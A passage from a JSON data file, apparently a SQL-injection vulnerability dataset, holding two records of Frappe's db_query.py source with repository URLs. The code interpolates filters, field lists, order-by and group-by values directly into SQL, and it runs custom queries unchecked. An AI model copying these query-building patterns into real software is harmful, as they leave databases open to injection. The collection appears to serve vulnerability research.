\"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator in ('in', 'not in'):\n\t\t\tvalues = f.value\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator=='Between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\t\t\t\tvalue = \"'%s' AND '%s'\" % (\n\t\t\t\t\tget_datetime(f.value[0]).strftime(\"%Y-%m-%d %H:%M:%S.%f\"),\n\t\t\t\t\tadd_to_date(get_datetime(f.value[1]),days=1).strftime(\"%Y-%m-%d %H:%M:%S.%f\"))\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif df and df.fieldtype==\"Datetime\":\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator in (\"like\", \"not like\") or (isinstance(f.value, basestring) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator in (\"like\", \"not like\") and isinstance(value, basestring):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, basestring) and not f.operator=='Between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.defaults.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcondition = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tcondition += \"\"\" or `tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values])\n\t\t\t\t\t)\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif meta.is_submittable:\n\t\t\t\t\targs.order_by = \"`tab{0}`.docstatus asc, {1}\".format(self.doctype, args.order_by)\n\n\tdef check_sort_by_table(self, order_by):\n\t\tif \".\" in order_by:\n\t\t\ttbl = order_by.split('.')[0]\n\t\t\tif tbl not in self.tables:\n\t\t\t\tif tbl.startswith('`'):\n\t\t\t\t\ttbl = tbl[4:-1]\n\t\t\t\tfrappe.throw(_(\"Please select atleast 1 column from {0} to sort\").format(tbl))\n\n\tdef add_limit(self):\n\t\tif self.limit_page_length:\n\t\t\treturn 'limit %s, %s' % (self.limit_start, self.limit_page_length)\n\t\telse:\n\t\t\treturn ''\n\n\tdef add_comment_count(self, result):\n\t\tfor r in result:\n\t\t\tif not r.name:\n\t\t\t\tcontinue\n\n\t\t\tr._comment_count = 0\n\t\t\tif \"_comments\" in r:\n\t\t\t\tr._comment_count = len(json.loads(r._comments or \"[]\"))\n\n\tdef update_list_settings(self):\n\t\t# update list settings if new search\n\t\tlist_settings = json.loads(get_list_settings(self.doctype) or '{}')\n\t\tlist_settings['filters'] = self.filters\n\t\tlist_settings['limit'] = self.limit_page_length\n\t\tlist_settings['order_by'] = self.order_by\n\n\t\tif self.save_list_settings_fields:\n\t\t\tlist_settings['fields'] = self.list_settings_fields\n\n\t\tupdate_list_settings(self.doctype, list_settings)\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Eddiy/frappe/blob/d1e573dba8c1a4dc3f086686a5fee0befe113e8a",
        "file_path": "/frappe/model/db_query.py",
        "source": "# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\"\"\"build query for doclistview and return results\"\"\"\n\nimport frappe, json, copy\nimport frappe.defaults\nimport frappe.share\nimport frappe.permissions\nfrom frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date\nfrom frappe import _\nfrom frappe.model import optional_fields\nfrom frappe.model.utils.list_settings import get_list_settings, update_list_settings\n\nclass DatabaseQuery(object):\n\tdef __init__(self, doctype):\n\t\tself.doctype = doctype\n\t\tself.tables = []\n\t\tself.conditions = []\n\t\tself.or_conditions = []\n\t\tself.fields = None\n\t\tself.user = None\n\t\tself.ignore_ifnull = False\n\t\tself.flags = frappe._dict()\n\n\tdef execute(self, query=None, fields=None, filters=None, or_filters=None,\n\t\tdocstatus=None, group_by=None, order_by=None, limit_start=False,\n\t\tlimit_page_length=None, as_list=False, with_childnames=False, debug=False,\n\t\tignore_permissions=False, user=None, with_comment_count=False,\n\t\tjoin='left join', distinct=False, start=None, page_length=None, limit=None,\n\t\tignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,\n\t\tupdate=None, add_total_row=None):\n\t\tif not ignore_permissions and not frappe.has_permission(self.doctype, \"read\", user=user):\n\t\t\traise frappe.PermissionError, self.doctype\n\n\t\t# fitlers and fields swappable\n\t\t# its hard to remember what comes first\n\t\tif (isinstance(fields, dict)\n\t\t\tor (isinstance(fields, list) and fields and isinstance(fields[0], list))):\n\t\t\t# if fields is given as dict/list of list, its probably filters\n\t\t\tfilters, fields = fields, filters\n\n\t\telif fields and isinstance(filters, list) \\\n\t\t\tand len(filters) > 1 and isinstance(filters[0], basestring):\n\t\t\t# if `filters` is a list of strings, its probably fields\n\t\t\tfilters, fields = fields, filters\n\n\t\tif fields:\n\t\t\tself.fields = fields\n\t\telse:\n\t\t\tself.fields =  [\"`tab{0}`.`name`\".format(self.doctype)]\n\n\t\tif start: limit_start = start\n\t\tif page_length: limit_page_length = page_length\n\t\tif limit: limit_page_length = limit\n\n\t\tself.filters = filters or []\n\t\tself.or_filters = or_filters or []\n\t\tself.docstatus = docstatus or []\n\t\tself.group_by = group_by\n\t\tself.order_by = order_by\n\t\tself.limit_start = 0 if (limit_start is False) else cint(limit_start)\n\t\tself.limit_page_length = cint(limit_page_length) if limit_page_length else None\n\t\tself.with_childnames = with_childnames\n\t\tself.debug = debug\n\t\tself.join = join\n\t\tself.distinct = distinct\n\t\tself.as_list = as_list\n\t\tself.ignore_ifnull = ignore_ifnull\n\t\tself.flags.ignore_permissions = ignore_permissions\n\t\tself.user = user or frappe.session.user\n\t\tself.update = update\n\t\tself.list_settings_fields = copy.deepcopy(self.fields)\n\t\t#self.debug = True\n\n\t\tif query:\n\t\t\tresult = self.run_custom_query(query)\n\t\telse:\n\t\t\tresult = self.build_and_run()\n\n\t\tif with_comment_count and not as_list and self.doctype:\n\t\t\tself.add_comment_count(result)\n\n\t\tif save_list_settings:\n\t\t\tself.save_list_settings_fields = save_list_settings_fields\n\t\t\tself.update_list_settings()\n\n\t\treturn result\n\n\tdef build_and_run(self):\n\t\targs = self.prepare_args()\n\t\targs.limit = self.add_limit()\n\n\t\tif args.conditions:\n\t\t\targs.conditions = \"where \" + args.conditions\n\n\t\tif self.distinct:\n\t\t\targs.fields = 'distinct ' + args.fields\n\n\t\tquery = \"\"\"select %(fields)s from %(tables)s %(conditions)s\n\t\t\t%(group_by)s %(order_by)s %(limit)s\"\"\" % args\n\n\t\treturn frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)\n\n\tdef prepare_args(self):\n\t\tself.parse_args()\n\t\tself.extract_tables()\n\t\tself.set_optional_columns()\n\t\tself.build_conditions()\n\n\t\targs = frappe._dict()\n\n\t\tif self.with_childnames:\n\t\t\tfor t in self.tables:\n\t\t\t\tif t != \"`tab\" + self.doctype + \"`\":\n\t\t\t\t\tself.fields.append(t + \".name as '%s:name'\" % t[4:-1])\n\n\t\t# query dict\n\t\targs.tables = self.tables[0]\n\n\t\t# left join parent, child tables\n\t\tfor child in self.tables[1:]:\n\t\t\targs.tables += \" {join} {child} on ({child}.parent = {main}.name)\".format(join=self.join,\n\t\t\t\tchild=child, main=self.tables[0])\n\n\t\tif self.grouped_or_conditions:\n\t\t\tself.conditions.append(\"({0})\".format(\" or \".join(self.grouped_or_conditions)))\n\n\t\targs.conditions = ' and '.join(self.conditions)\n\n\t\tif self.or_conditions:\n\t\t\targs.conditions += (' or ' if args.conditions else \"\") + \\\n\t\t\t\t ' or '.join(self.or_conditions)\n\n\t\tself.set_field_tables()\n\n\t\targs.fields = ', '.join(self.fields)\n\n\t\tself.set_order_by(args)\n\t\tself.check_sort_by_table(args.order_by)\n\t\targs.order_by = args.order_by and (\" order by \" + args.order_by) or \"\"\n\n\t\targs.group_by = self.group_by and (\" group by \" + self.group_by) or \"\"\n\n\t\treturn args\n\n\tdef parse_args(self):\n\t\t\"\"\"Convert fields and filters from strings to list, dicts\"\"\"\n\t\tif isinstance(self.fields, basestring):\n\t\t\tif self.fields == \"*\":\n\t\t\t\tself.fields = [\"*\"]\n\t\t\telse:\n\t\t\t\ttry:\n\t\t\t\t\tself.fields = json.loads(self.fields)\n\t\t\t\texcept ValueError:\n\t\t\t\t\tself.fields = [f.strip() for f in self.fields.split(\",\")]\n\n\t\tfor filter_name in [\"filters\", \"or_filters\"]:\n\t\t\tfilters = getattr(self, filter_name)\n\t\t\tif isinstance(filters, basestring):\n\t\t\t\tfilters = json.loads(filters)\n\n\t\t\tif isinstance(filters, dict):\n\t\t\t\tfdict = filters\n\t\t\t\tfilters = []\n\t\t\t\tfor key, value in fdict.iteritems():\n\t\t\t\t\tfilters.append(make_filter_tuple(self.doctype, key, value))\n\t\t\tsetattr(self, filter_name, filters)\n\n\tdef extract_tables(self):\n\t\t\"\"\"extract tables from fields\"\"\"\n\t\tself.tables = ['`tab' + self.doctype + '`']\n\n\t\t# add tables from fields\n\t\tif self.fields:\n\t\t\tfor f in self.fields:\n\t\t\t\tif ( not (\"tab\" in f and \".\" in f) ) or (\"locate(\" in f): continue\n\n\n\t\t\t\ttable_name = f.split('.')[0]\n\t\t\t\tif table_name.lower().startswith('group_concat('):\n\t\t\t\t\ttable_name = table_name[13:]\n\t\t\t\tif table_name.lower().startswith('ifnull('):\n\t\t\t\t\ttable_name = table_name[7:]\n\t\t\t\tif not table_name[0]=='`':\n\t\t\t\t\ttable_name = '`' + table_name + '`'\n\t\t\t\tif not table_name in self.tables:\n\t\t\t\t\tself.append_table(table_name)\n\n\tdef append_table(self, table_name):\n\t\tself.tables.append(table_name)\n\t\tdoctype = table_name[4:-1]\n\t\tif (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):\n\t\t\traise frappe.PermissionError, doctype\n\n\tdef set_field_tables(self):\n\t\t'''If there are more than one table, the fieldname must not be ambigous.\n\t\tIf the fieldname is not explicitly mentioned, set the default table'''\n\t\tif len(self.tables) > 1:\n\t\t\tfor i, f in enumerate(self.fields):\n\t\t\t\tif '.' not in f:\n\t\t\t\t\tself.fields[i] = '{0}.{1}'.format(self.tables[0], f)\n\n\tdef set_optional_columns(self):\n\t\t\"\"\"Removes optional columns like `_user_tags`, `_comments` etc. if not in table\"\"\"\n\t\tcolumns = frappe.db.get_table_columns(self.doctype)\n\n\t\t# remove from fields\n\t\tto_remove = []\n\t\tfor fld in self.fields:\n\t\t\tfor f in optional_fields:\n\t\t\t\tif f in fld and not f in columns:\n\t\t\t\t\tto_remove.append(fld)\n\n\t\tfor fld in to_remove:\n\t\t\tdel self.fields[self.fields.index(fld)]\n\n\t\t# remove from filters\n\t\tto_remove = []\n\t\tfor each in self.filters:\n\t\t\tif isinstance(each, basestring):\n\t\t\t\teach = [each]\n\n\t\t\tfor element in each:\n\t\t\t\tif element in optional_fields and element not in columns:\n\t\t\t\t\tto_remove.append(each)\n\n\t\tfor each in to_remove:\n\t\t\tif isinstance(self.filters, dict):\n\t\t\t\tdel self.filters[each]\n\t\t\telse:\n\t\t\t\tself.filters.remove(each)\n\n\tdef build_conditions(self):\n\t\tself.conditions = []\n\t\tself.grouped_or_conditions = []\n\t\tself.build_filter_conditions(self.filters, self.conditions)\n\t\tself.build_filter_conditions(self.or_filters, self.grouped_or_conditions)\n\n\t\t# match conditions\n\t\tif not self.flags.ignore_permissions:\n\t\t\tmatch_conditions = self.build_match_conditions()\n\t\t\tif match_conditions:\n\t\t\t\tself.conditions.append(\"(\" + match_conditions + \")\")\n\n\tdef build_filter_conditions(self, filters, conditions):\n\t\t\"\"\"build conditions from user filters\"\"\"\n\t\tif isinstance(filters, dict):\n\t\t\tfilters = [filters]\n\n\t\tfor f in filters:\n\t\t\tif isinstance(f, basestring):\n\t\t\t\tconditions.append(f)\n\t\t\telse:\n\t\t\t\tconditions.append(self.prepare_filter_condition(f))\n\n\tdef prepare_filter_condition(self, f):\n\t\t\"\"\"Returns a filter condition in the format:\n\n\t\t\t\tifnull(`tabDocType`.`fieldname`, fallback) operator \"value\"\n\t\t\"\"\"\n\n\t\tf = get_filter(self.doctype, f)\n\n\t\ttname = ('`tab' + f.doctype + '`')\n\t\tif not tname in self.tables:\n\t\t\tself.append_table(tname)\n\n\t\tif 'ifnull(' in f.fieldname:\n\t\t\tcolumn_name = f.fieldname\n\t\telse:\n\t\t\tcolumn_name = '{tname}.{fname}'.format(tname=tname,\n\t\t\t\tfname=f.fieldname)\n\n\t\tcan_be_null = True\n\n\t\t# prepare in condition\n\t\tif f.operator in ('in', 'not in'):\n\t\t\tvalues = f.value\n\t\t\tif not isinstance(values, (list, tuple)):\n\t\t\t\tvalues = values.split(\",\")\n\n\t\t\tfallback = \"''\"\n\t\t\tvalue = (frappe.db.escape((v or '').strip(), percent=False) for v in values)\n\t\t\tvalue = '(\"{0}\")'.format('\", \"'.join(value))\n\t\telse:\n\t\t\tdf = frappe.get_meta(f.doctype).get(\"fields\", {\"fieldname\": f.fieldname})\n\t\t\tdf = df[0] if df else None\n\n\t\t\tif df and df.fieldtype in (\"Check\", \"Float\", \"Int\", \"Currency\", \"Percent\"):\n\t\t\t\tcan_be_null = False\n\n\t\t\tif f.operator=='Between' and \\\n\t\t\t\t(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==\"Date\" or df.fieldtype==\"Datetime\"))):\n\t\t\t\tvalue = \"'%s' AND '%s'\" % (\n\t\t\t\t\tget_datetime(f.value[0]).strftime(\"%Y-%m-%d %H:%M:%S.%f\"),\n\t\t\t\t\tadd_to_date(get_datetime(f.value[1]),days=1).strftime(\"%Y-%m-%d %H:%M:%S.%f\"))\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\t\t\telif df and df.fieldtype==\"Date\":\n\t\t\t\tvalue = getdate(f.value).strftime(\"%Y-%m-%d\")\n\t\t\t\tfallback = \"'0000-00-00'\"\n\n\t\t\telif df and df.fieldtype==\"Datetime\":\n\t\t\t\tvalue = get_datetime(f.value).strftime(\"%Y-%m-%d %H:%M:%S.%f\")\n\t\t\t\tfallback = \"'0000-00-00 00:00:00'\"\n\n\t\t\telif df and df.fieldtype==\"Time\":\n\t\t\t\tvalue = get_time(f.value).strftime(\"%H:%M:%S.%f\")\n\t\t\t\tfallback = \"'00:00:00'\"\n\n\t\t\telif f.operator in (\"like\", \"not like\") or (isinstance(f.value, basestring) and\n\t\t\t\t(not df or df.fieldtype not in [\"Float\", \"Int\", \"Currency\", \"Percent\", \"Check\"])):\n\t\t\t\t\tvalue = \"\" if f.value==None else f.value\n\t\t\t\t\tfallback = '\"\"'\n\n\t\t\t\t\tif f.operator in (\"like\", \"not like\") and isinstance(value, basestring):\n\t\t\t\t\t\t# because \"like\" uses backslash (\\) for escaping\n\t\t\t\t\t\tvalue = value.replace(\"\\\\\", \"\\\\\\\\\").replace(\"%\", \"%%\")\n\n\t\t\telse:\n\t\t\t\tvalue = flt(f.value)\n\t\t\t\tfallback = 0\n\n\t\t\t# put it inside double quotes\n\t\t\tif isinstance(value, basestring) and not f.operator=='Between':\n\t\t\t\tvalue = '\"{0}\"'.format(frappe.db.escape(value, percent=False))\n\n\t\tif (self.ignore_ifnull\n\t\t\tor not can_be_null\n\t\t\tor (f.value and f.operator in ('=', 'like'))\n\t\t\tor 'ifnull(' in column_name.lower()):\n\t\t\tcondition = '{column_name} {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, operator=f.operator,\n\t\t\t\tvalue=value)\n\t\telse:\n\t\t\tcondition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(\n\t\t\t\tcolumn_name=column_name, fallback=fallback, operator=f.operator,\n\t\t\t\tvalue=value)\n\n\t\treturn condition\n\n\tdef build_match_conditions(self, as_condition=True):\n\t\t\"\"\"add match conditions if applicable\"\"\"\n\t\tself.match_filters = []\n\t\tself.match_conditions = []\n\t\tonly_if_shared = False\n\t\tif not self.user:\n\t\t\tself.user = frappe.session.user\n\n\t\tif not self.tables: self.extract_tables()\n\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\trole_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)\n\n\t\tself.shared = frappe.share.get_shared(self.doctype, self.user)\n\n\t\tif not meta.istable and not role_permissions.get(\"read\") and not self.flags.ignore_permissions:\n\t\t\tonly_if_shared = True\n\t\t\tif not self.shared:\n\t\t\t\tfrappe.throw(_(\"No permission to read {0}\").format(self.doctype), frappe.PermissionError)\n\t\t\telse:\n\t\t\t\tself.conditions.append(self.get_share_condition())\n\n\t\telse:\n\t\t\t# apply user permissions?\n\t\t\tif role_permissions.get(\"apply_user_permissions\", {}).get(\"read\"):\n\t\t\t\t# get user permissions\n\t\t\t\tuser_permissions = frappe.defaults.get_user_permissions(self.user)\n\t\t\t\tself.add_user_permissions(user_permissions,\n\t\t\t\t\tuser_permission_doctypes=role_permissions.get(\"user_permission_doctypes\").get(\"read\"))\n\n\t\t\tif role_permissions.get(\"if_owner\", {}).get(\"read\"):\n\t\t\t\tself.match_conditions.append(\"`tab{0}`.owner = '{1}'\".format(self.doctype,\n\t\t\t\t\tfrappe.db.escape(self.user, percent=False)))\n\n\t\tif as_condition:\n\t\t\tconditions = \"\"\n\t\t\tif self.match_conditions:\n\t\t\t\t# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))\n\t\t\t\tconditions = \"((\" + \") or (\".join(self.match_conditions) + \"))\"\n\n\t\t\tdoctype_conditions = self.get_permission_query_conditions()\n\t\t\tif doctype_conditions:\n\t\t\t\tconditions += (' and ' + doctype_conditions) if conditions else doctype_conditions\n\n\t\t\t# share is an OR condition, if there is a role permission\n\t\t\tif not only_if_shared and self.shared and conditions:\n\t\t\t\tconditions =  \"({conditions}) or ({shared_condition})\".format(\n\t\t\t\t\tconditions=conditions, shared_condition=self.get_share_condition())\n\n\t\t\treturn conditions\n\n\t\telse:\n\t\t\treturn self.match_filters\n\n\tdef get_share_condition(self):\n\t\treturn \"\"\"`tab{0}`.name in ({1})\"\"\".format(self.doctype, \", \".join([\"'%s'\"] * len(self.shared))) % \\\n\t\t\ttuple([frappe.db.escape(s, percent=False) for s in self.shared])\n\n\tdef add_user_permissions(self, user_permissions, user_permission_doctypes=None):\n\t\tuser_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)\n\t\tmeta = frappe.get_meta(self.doctype)\n\n\t\tfor doctypes in user_permission_doctypes:\n\t\t\tmatch_filters = {}\n\t\t\tmatch_conditions = []\n\t\t\t# check in links\n\t\t\tfor df in meta.get_fields_to_check_permissions(doctypes):\n\t\t\t\tuser_permission_values = user_permissions.get(df.options, [])\n\n\t\t\t\tcondition = 'ifnull(`tab{doctype}`.`{fieldname}`, \"\")=\"\"'.format(doctype=self.doctype, fieldname=df.fieldname)\n\t\t\t\tif user_permission_values:\n\t\t\t\t\tcondition += \"\"\" or `tab{doctype}`.`{fieldname}` in ({values})\"\"\".format(\n\t\t\t\t\t\tdoctype=self.doctype, fieldname=df.fieldname,\n\t\t\t\t\t\tvalues=\", \".join([('\"'+frappe.db.escape(v, percent=False)+'\"') for v in user_permission_values])\n\t\t\t\t\t)\n\t\t\t\tmatch_conditions.append(\"({condition})\".format(condition=condition))\n\n\t\t\t\tmatch_filters[df.options] = user_permission_values\n\n\t\t\tif match_conditions:\n\t\t\t\tself.match_conditions.append(\" and \".join(match_conditions))\n\n\t\t\tif match_filters:\n\t\t\t\tself.match_filters.append(match_filters)\n\n\tdef get_permission_query_conditions(self):\n\t\tcondition_methods = frappe.get_hooks(\"permission_query_conditions\", {}).get(self.doctype, [])\n\t\tif condition_methods:\n\t\t\tconditions = []\n\t\t\tfor method in condition_methods:\n\t\t\t\tc = frappe.call(frappe.get_attr(method), self.user)\n\t\t\t\tif c:\n\t\t\t\t\tconditions.append(c)\n\n\t\t\treturn \" and \".join(conditions) if conditions else None\n\n\tdef run_custom_query(self, query):\n\t\tif '%(key)s' in query:\n\t\t\tquery = query.replace('%(key)s', 'name')\n\t\treturn frappe.db.sql(query, as_dict = (not self.as_list))\n\n\tdef set_order_by(self, args):\n\t\tmeta = frappe.get_meta(self.doctype)\n\t\tif self.order_by:\n\t\t\targs.order_by = self.order_by\n\t\telse:\n\t\t\targs.order_by = \"\"\n\n\t\t\t# don't add order by from meta if a mysql group function is used without group by clause\n\t\t\tgroup_function_without_group_by = (len(self.fields)==1 and\n\t\t\t\t(\tself.fields[0].lower().startswith(\"count(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"min(\")\n\t\t\t\t\tor self.fields[0].lower().startswith(\"max(\")\n\t\t\t\t) and not self.group_by)\n\n\t\t\tif not group_function_without_group_by:\n\t\t\t\tsort_field = sort_order = None\n\t\t\t\tif meta.sort_field and ',' in meta.sort_field:\n\t\t\t\t\t# multiple sort given in doctype definition\n\t\t\t\t\t# Example:\n\t\t\t\t\t# `idx desc, modified desc`\n\t\t\t\t\t# will covert to\n\t\t\t\t\t# `tabItem`.`idx` desc, `tabItem`.`modified` desc\n\t\t\t\t\targs.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,\n\t\t\t\t\t\tf.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])\n\t\t\t\telse:\n\t\t\t\t\tsort_field = meta.sort_field or 'modified'\n\t\t\t\t\tsort_order = (meta.sort_field and meta.sort_order) or 'desc'\n\n\t\t\t\t\targs.order_by = \"`tab{0}`.`{1}` {2}\".format(self.doctype, sort_field or \"modified\", sort_order or \"desc\")\n\n\t\t\t\t# draft docs always on top\n\t\t\t\tif 